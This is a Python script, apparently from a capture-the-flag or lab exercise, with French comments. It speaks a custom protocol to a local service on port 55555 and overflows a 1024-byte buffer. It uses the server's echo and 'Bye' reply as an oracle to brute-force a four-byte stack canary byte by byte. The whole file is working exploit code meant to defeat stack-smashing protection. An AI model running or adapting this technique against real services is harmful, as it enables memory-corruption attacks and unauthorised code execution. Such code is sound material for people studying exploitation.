#!/usr/bin/python3

import socket as S
from binascii import hexlify
from struct import pack


def oracle(username=b'toto', data=b'', timeout=0.5):

    try:
        s = S.socket(S.AF_INET, S.SOCK_STREAM)

        if timeout:
            s.settimeout(timeout)

        s.connect(('127.0.0.1', 55555))

        # Hello
        s.send(pack("<H", 0))
        s.send(username)
        s.recv(100)

        # Ping
        s.send(pack("<H", 1))

        # 1024 octets de buffer
        buf = b'A' * 1024
        buf += data

        s.send(pack("<H", len(buf)))
        s.send(buf)

        rep = s.recv(len(buf))

        if rep != buf:
            s.close()
            return False

        # Bye
        s.send(pack("<H", 2))
        bye = s.recv(100)

        if bye != b'Bye toto':
            s.close()
            return False

        s.close()

    except Exception:
        return False

    return True


def bruteforce_stack(size):

    data = b''

    while len(data) < size:

        found = False

        for b in range(256):
            
            print(
                "Candidat : 0x%02x" % b,
                end="\r",
                flush=True
            )

            send_data = data + bytes([b])

            if oracle(data=send_data):

                data = send_data
                found = True

                print(" " * 40, end="\r")

                print(
                    "Trouvé : 0x%02x   |   Canari : %s"
                    % (b, hexlify(data).decode())
                )

                break

        assert found

    return data


def main():

    canary = bruteforce_stack(4)

    print()
    print("Canari final :", hexlify(canary).decode())


if __name__ == '__main__':
    main()
